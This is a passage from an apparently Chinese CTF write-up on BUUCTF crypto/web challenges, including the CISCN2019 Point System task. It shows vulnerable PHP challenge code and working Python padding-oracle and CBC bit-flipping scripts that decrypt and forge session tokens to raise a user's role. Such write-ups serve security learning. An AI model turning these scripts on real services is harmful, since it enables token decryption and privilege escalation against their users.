</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">aes_encrypt</span>($iv,$data);
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>($_GET[<span style="color:#e6db74">&#39;method&#39;</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;decrypt&#34;</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    $iv <span style="color:#f92672">=</span> <span style="color:#f92672">@</span>$_POST[<span style="color:#e6db74">&#39;iv&#39;</span>];
</span></span><span style="display:flex;"><span>    $data <span style="color:#f92672">=</span> <span style="color:#f92672">@</span>$_POST[<span style="color:#e6db74">&#39;data&#39;</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">aes_decrypt</span>($iv,$data);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;我摊牌了，就是懒得写前端&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">BR</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>($_GET[<span style="color:#e6db74">&#39;source&#39;</span>]<span style="color:#f92672">==</span><span style="color:#ae81ff">1</span>)<span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>使用<code>padding oracle attack</code>来解出明文内容, 这里比较简单, 明文长度仅仅只有一个分组, 只需要修改iv求出中间值之后和原来的iv进行抑或操作就可以得到明文了, 脚本如下</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://71a04ae9-0b21-46fd-a550-d1aa35a3619a.node3.buuoj.cn/index.php?method=decrypt&amp;source=0&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>encrypt <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ly7auKVQCZWum/W/4osuPA==&#34;</span>
</span></span><span style="display:flex;"><span>enc <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(encrypt<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;utf8&#34;</span>))
</span></span><span style="display:flex;"><span>iv <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;6666666666666666&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>get <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">17</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">256</span>):
</span></span><span style="display:flex;"><span>        iv_tmp <span style="color:#f92672">=</span> chr(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span>(<span style="color:#ae81ff">16</span><span style="color:#f92672">-</span>i) <span style="color:#f92672">+</span> chr(j) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join([chr(ord(get[n]) <span style="color:#f92672">^</span> i) <span style="color:#66d9ef">for</span> n <span style="color:#f92672">in</span> range(len(get))])
</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;iv&#39;</span>:iv_tmp,
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;data&#39;</span>:encrypt
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url,data<span style="color:#f92672">=</span>data)
</span></span><span style="display:flex;"><span>        print(res<span style="color:#f92672">.</span>text)
</span></span><span style="display:flex;"><span>        time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1.5</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;False&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> res<span style="color:#f92672">.</span>text:
</span></span><span style="display:flex;"><span>            get <span style="color:#f92672">=</span> chr(j <span style="color:#f92672">^</span> i)<span style="color:#f92672">+</span> get
</span></span><span style="display:flex;"><span>            print(get)
</span></span><span style="display:flex;"><span>            print(base64<span style="color:#f92672">.</span>b64encode(get<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;utf8&#34;</span>)))
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(base64<span style="color:#f92672">.</span>b64encode(get<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;utf8&#34;</span>)))
</span></span></code></pre></div><p>得到了一个地址, 访问之发现下一个问题考察cbc字节翻转攻击,题目如下</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> 
</span></span><span style="display:flex;"><span><span style="color:#75715e">#error_reporting(0);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#39;config.php&#39;</span>);    <span style="color:#75715e">//$fl4g
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#34;METHOD&#34;</span>, <span style="color:#e6db74">&#34;aes-128-cbc&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#34;SECRET_KEY&#34;</span>, <span style="color:#e6db74">&#34;6666666&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">session_start</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">get_iv</span>(){    <span style="color:#75715e">//生成随机初始向量IV
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    $random_iv<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>($i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;$i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">16</span>;$i<span style="color:#f92672">++</span>){
</span></span><span style="display:flex;"><span>        $random_iv<span style="color:#f92672">.=</span><span style="color:#a6e22e">chr</span>(<span style="color:#a6e22e">rand</span>(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">255</span>));
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> $random_iv;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$lalala <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;piapiapiapia&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_SESSION[<span style="color:#e6db74">&#39;Identity&#39;</span>])){
</span></span><span style="display:flex;"><span>    $_SESSION[<span style="color:#e6db74">&#39;iv&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_iv</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    $_SESSION[<span style="color:#e6db74">&#39;Identity&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_encode</span>(<span style="color:#a6e22e">openssl_encrypt</span>($lalala, <span style="color:#a6e22e">METHOD</span>, <span style="color:#a6e22e">SECRET_KEY</span>, <span style="color:#a6e22e">OPENSSL_RAW_DATA</span>, $_SESSION[<span style="color:#e6db74">&#39;iv&#39;</span>]));
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">base64_encode</span>($_SESSION[<span style="color:#e6db74">&#39;iv&#39;</span>])<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&lt;br&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;iv&#39;</span>])){
</span></span><span style="display:flex;"><span>    $tmp_id <span style="color:#f92672">=</span> <span style="color:#a6e22e">openssl_decrypt</span>(<span style="color:#a6e22e">base64_decode</span>($_SESSION[<span style="color:#e6db74">&#39;Identity&#39;</span>]), <span style="color:#a6e22e">METHOD</span>, <span style="color:#a6e22e">SECRET_KEY</span>, <span style="color:#a6e22e">OPENSSL_RAW_DATA</span>, <span style="color:#a6e22e">base64_decode</span>($_POST[<span style="color:#e6db74">&#39;iv&#39;</span>]));
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> $tmp_id<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&lt;br&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>($tmp_id <span style="color:#f92672">===</span><span style="color:#e6db74">&#39;weber&#39;</span>)<span style="color:#66d9ef">die</span>($fl4g);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>脚本, 注意这里需要将字符串补全到16个字节</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>target <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;weber</span><span style="color:#ae81ff">\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>orginal <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;piapiapiapia</span><span style="color:#ae81ff">\x04\x04\x04\x04</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>iv <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(<span style="color:#e6db74">&#34;JLSjjNcJ+cOULHUC0DhRSw==&#34;</span>)
</span></span><span style="display:flex;"><span>result <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):
</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">+=</span> bytes([target[i] <span style="color:#f92672">^</span> iv[i] <span style="color:#f92672">^</span> orginal[i]])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(base64<span style="color:#f92672">.</span>b64encode(result))
</span></span></code></pre></div><p><img loading="lazy" src="image-20211114141832885.png" alt="image-20211114141832885"  />
</p>
<h2 id="ciscn2019-东北赛区-day2-web3point-system">[CISCN2019 东北赛区 Day2 Web3]Point System<a hidden class="anchor" aria-hidden="true" href="#ciscn2019-东北赛区-day2-web3point-system">#</a></h2>
<p>打开是一个登录界面, 访问<code>robots.txt</code>, 发现一个html, 里面是很多api</p>
<p><img loading="lazy" src="image-20200203003409598.png" alt="image-20200203003409598"  />
</p>
<p>试着按照里面的使用方法来注册一个用户, 然后回到登录界面登录提示权限不足, 看看浏览器的network</p>
<p><img loading="lazy" src="image-20200203004257291.png" alt="image-20200203004257291"  />
</p>
<p>除了向login和info都请求了一次, 看看详情</p>
<p>向login发请求后返回的是</p>
<pre tabindex="0"><code>{&#34;code&#34;:100,&#34;data&#34;:{&#34;token&#34;:&#34;eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaFRXUWdpd1pvaGoyN0pXdDk4LysxWjZsY3ZSbnFBWVpSQmF6Y2UrNVg3dFJJNkdsa3JDVUtaby9qNzJxdnE5TjRHZVNpc2ozQlZZWXZ0OFkzVkZQd2t0SUR5c21DSk10SjdFQWtZSDVTRS93PT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoiTFQ0NXNSOU5SMWpxR0ZsWWJtMUxzeDhWM2l1NEpQT3YiLCJleHBpcmVfaW4iOjE1ODA2Njg5NTF9&#34;}}
</code></pre><p>向info请求的头中</p>
<pre tabindex="0"><code>Cookie: Key=eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaFRXUWdpd1pvaGoyN0pXdDk4LysxWjZsY3ZSbnFBWVpSQmF6Y2UrNVg3dFJJNkdsa3JDVUtaby9qNzJxdnE5TjRHZVNpc2ozQlZZWXZ0OFkzVkZQd2t0SUR5c21DSk10SjdFQWtZSDVTRS93PT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoiTFQ0NXNSOU5SMWpxR0ZsWWJtMUxzeDhWM2l1NEpQT3YiLCJleHBpcmVfaW4iOjE1ODA2Njg5NTF9
</code></pre><p>请求后返回的是</p>
<pre tabindex="0"><code>{&#34;code&#34;:100,&#34;data&#34;:{&#34;user_role&#34;:3,&#34;uid&#34;:1}}
</code></pre><p>token解码一下看看</p>
<pre tabindex="0"><code>{&#34;signed_key&#34;:&#34;SUN4a1NpbmdEYW5jZVJhUHsFQR4ln5VFC9L09echkYhTWQgiwZohj27JWt98/+1Z6lcvRnqAYZRBazce+5X7tRI6GlkrCUKZo/j72qvq9N4GeSisj3BVYYvt8Y3VFPwktIDysmCJMtJ7EAkYH5SE/w==&#34;,&#34;role&#34;:3,&#34;user_id&#34;:1,&#34;payload&#34;:&#34;LT45sR9NR1jqGFlYbm1Lsx8V3iu4JPOv&#34;,&#34;expire_in&#34;:1580668951}
</code></pre><p>sign_key解码看看</p>
<pre tabindex="0"><code>ICxkSingDanceRaP{A%EÒôõç!SY&#34;Á!nÉZß|ÿíYêW/FzaAk7ûûµ:Y+	B£øûÚ«êôÞy(¬pUaíñÕü$´ò²`2Ò{	ÿ
</code></pre><p>&ldquo;我蔡徐坤唱跳rap&rdquo;&hellip;&hellip;&hellip;&hellip;.然后后面是乱码, 这个玩意就是<strong>cbc加密的特征</strong>, 那么signed_key就是cbc加密后经过base64的密文, 还得用<code>padding oracle attack</code>解出明文来</p>
<p>解密过程:</p>
<p><img loading="lazy" src="15078975303136.png" alt="img"  />
</p>
<p><img loading="lazy" src="15078976262418.png!small" alt="img"  />
</p>
<pre tabindex="0"><code>C1 ^ 中间值的最后一位 = 0×01
中间值的最后一位 = C1 ^ 0×01

C1 ^ 中间值的最后2位 = 0×02 0x02
中间值的最后2位 = C1 ^ (0×02 0x02)

....
一直到推出整个C2的中间值,和C1异或就得到了C2的明文
</code></pre><p>同理, 可以破解整个明文</p>
<p>这是从其他师傅偷过来的脚本</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;938a4575-3337-42bd-b712-45b008d529c5.node3.buuoj.cn&#34;</span>
</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">padding_oracle</span>(key):
</span></span><span style="display:flex;"><span>    user_key_decode <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(key)
</span></span><span style="display:flex;"><span>    user_key_json_decode <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(user_key_decode)
</span></span><span style="display:flex;"><span>    signed_key <span style="color:#f92672">=</span> user_key_json_decode[<span style="color:#e6db74">&#39;signed_key&#39;</span>]
</span></span><span style="display:flex;"><span>    signed_key_decoded <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(signed_key)
</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://&#34;</span> <span style="color:#f92672">+</span> host <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/frontend/api/v1/user/info&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    N <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    total_plain <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>   
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> block <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(signed_key_decoded) <span style="color:#f92672">//</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>):
</span></span><span style="display:flex;"><span>        token <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>        get <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># 对每一块密文</span>
</span></span><span style="display:flex;"><span>        cipher <span style="color:#f92672">=</span> signed_key_decoded[<span style="color:#ae81ff">16</span> <span style="color:#f92672">+</span> block <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span>:<span style="color:#ae81ff">32</span> <span style="color:#f92672">+</span> block <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># 对每一位</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, N<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># 爆破</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">256</span>):
</span></span><span style="display:flex;"><span>                time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># 已知位的padding对应的解密异或值</span>
</span></span><span style="display:flex;"><span>                padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join([(get[n] <span style="color:#f92672">^</span> i)<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#39;little&#39;</span>) <span style="color:#66d9ef">for</span> n <span style="color:#f92672">in</span> range(len(get))])
</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># 将解密异或值 和 这块密文作为一个signed_key尝试进行解密</span>
</span></span><span style="display:flex;"><span>                c <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">16</span> <span style="color:#f92672">-</span> i) <span style="color:#f92672">+</span> j<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#39;little&#39;</span>) <span style="color:#f92672">+</span> padding <span style="color:#f92672">+</span> cipher
</span></span><span style="display:flex;"><span>                <span style="color:#75715e">#print(c)</span>
</span></span><span style="display:flex;"><span>                token <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(c)
</span></span><span style="display:flex;"><span>                user_key_json_decode[<span style="color:#e6db74">&#39;signed_key&#39;</span>] <span style="color:#f92672">=</span> token<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)
</span></span><span style="display:flex;"><span>                header <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;Key&#39;</span>: base64<span style="color:#f92672">.</span>b64encode(bytes(json<span style="color:#f92672">.</span>dumps(user_key_json_decode), <span style="color:#e6db74">&#34;utf-8&#34;</span>))}
</span></span><span style="display:flex;"><span>                res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url, headers<span style="color:#f92672">=</span>header)
</span></span><span style="display:flex;"><span>                <span style="color:#75715e">#print(res.text, j)</span>
</span></span><span style="display:flex;"><span>                print(res<span style="color:#f92672">.</span>json())
</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># 205在测试的时候就是解密不成功, 其他的情况要么是解密成功但是不符合要求和符和要求的</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> res<span style="color:#f92672">.</span>json()[<span style="color:#e6db74">&#39;code&#39;</span>] <span style="color:#f92672">!=</span> <span style="color:#ae81ff">205</span>:
</span></span><span style="display:flex;"><span>                    get <span style="color:#f92672">=</span> (j <span style="color:#f92672">^</span> i)<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#39;little&#39;</span>) <span style="color:#f92672">+</span> get
</span></span><span style="display:flex;"><span>                    print(get, i)
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>                    
</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># 这里存疑, 为什么是不是signed_key_decoded[(block+1)*16 + i]呢</span>
</span></span><span style="display:flex;"><span>        plain <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join([(get[i] <span style="color:#f92672">^</span> signed_key_decoded[block <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">+</span> i])<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#39;little&#39;</span>) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(N)])
</span></span><span style="display:flex;"><span>        print(plain<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>), <span style="color:#e6db74">&#34;block=</span><span style="color:#e6db74">%d</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> block)
</span></span><span style="display:flex;"><span>        total_plain <span style="color:#f92672">+=</span> plain<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)
</span></span><span style="display:flex;"><span>        print(total_plain)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> total_plain
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>plain_text <span style="color:#f92672">=</span> padding_oracle(<span style="color:#e6db74">&#34;eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaFRXUWdpd1pvaGoyN0pXdDk4LysxWm5GZDFFRDNQZktJWnFnVnpYNW1uNUxFQWlubXJIYmJETVdaTHFrNE9kNTdQNDJqOHhmOVNWRHo3Z2RVVVJzVVVEbUVCWEtJUjU4a0E2K2VuVFZ3NXVRPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoibFZva0s2NzVnUjZ5WDFQUTBvMWVoSjJJYmx2MGRsTFgiLCJleHBpcmVfaW4iOjE1ODA2NTQ1MzJ9&#34;</span>)
</span></span><span style="display:flex;"><span>print(plain_text)
</span></span></code></pre></div><p>慢慢的可以跑出来明文, (假装跑出来了, 其实因为buu的防护请求多了直接断开连接, 但是可以跑出几位)</p>
<pre tabindex="0"><code>{&#34;role&#34;:3,&#34;user_id&#34;:1,&#34;payload&#34;:&#34;LT45sR9NR1jqGFlYbm1Lsx8V3iu4JPOv&#34;,&#34;expire_in&#34;:1580668951}
</code></pre><p>那么这个<code>signed_key</code>就是给后面的明文作为一个验证使用.</p>
<p>之前的那个没有权限登录, 就是这个<code>role</code>的关系, 要把它修改成1 , 就要把密文也修改了, 利用<code>cbc字节反转攻击</code>来修改密文.</p>
<p><img loading="lazy" src="15078975303136.png" alt="img"  />
</p>
<p>由于要修改的明文只是在第一区块中, 因此只需要修改IV就行了, 设 原明文为PB, 修改后的明文为PA</p>
<pre tabindex="0"><code>C[i] ^ PB[i] = IV[i]
C[i] ^ PA[i] = new_IV[i]

C[i] = PB[i] ^ IV[i]
PB[i] ^ PA[i] ^ IV[i] = new_IV[i]
</code></pre><p>还是偷来的脚本</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python2.7</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -*- coding:utf8 -*-</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;dd8b9a48-d183-45ea-831c-2fe0eb2b7e29.node3.buuoj.cn&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">cbc_attack</span>(key, block, origin_content, target_content):
</span></span><span style="display:flex;"><span>    user_key_decode <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(key)
</span></span><span style="display:flex;"><span>    user_key_json_decode <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(user_key_decode)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    signed_key <span style="color:#f92672">=</span> user_key_json_decode[<span style="color:#e6db74">&#39;signed_key&#39;</span>]
</span></span><span style="display:flex;"><span>    cipher_o <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(signed_key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> block <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>        iv_prefix <span style="color:#f92672">=</span> cipher_o[:block <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        iv_prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    iv <span style="color:#f92672">=</span> cipher_o[block <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span>:<span style="color:#ae81ff">16</span> <span style="color:#f92672">+</span> block <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    cipher <span style="color:#f92672">=</span> cipher_o[<span style="color:#ae81ff">16</span> <span style="color:#f92672">+</span> block <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span>:]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    iv_array <span style="color:#f92672">=</span> bytearray(iv)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">16</span>):
</span></span><span style="display:flex;"><span>        iv_array[i] <span style="color:#f92672">=</span> iv_array[i] <span style="color:#f92672">^</span> ord(origin_content[i]) <span style="color:#f92672">^</span> ord(target_content[i])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    iv <span style="color:#f92672">=</span> bytes(iv_array)
</span></span><span style="display:flex;"><span>
